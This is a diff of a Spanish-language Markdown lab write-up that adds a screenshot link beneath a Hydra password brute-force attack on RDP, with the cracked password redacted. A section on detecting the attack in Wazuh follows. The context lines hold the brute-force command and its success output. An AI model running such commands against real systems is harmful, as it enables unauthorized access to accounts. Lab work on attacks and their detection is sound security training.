@@ -54,7 +54,9 @@ hydra -l <usuario> -P passlist.txt -t 4 rdp://<IP-objetivo>
 [3389][rdp] host: <IP-objetivo>   login: <usuario>   password: [REDACTADO]
 1 of 1 target successfully completed, 1 valid password found
 ```
- 
+![Imagen del ataque ejecutado](screenshot/resultadofuerzabruta.png) 
+
+
 > **Nota de seguridad:** la contraseña real se omite intencionalmente de esta documentación pública, siguiendo buenas prácticas de manejo de credenciales incluso en un entorno de laboratorio.
  
 ## Detección en Wazuh
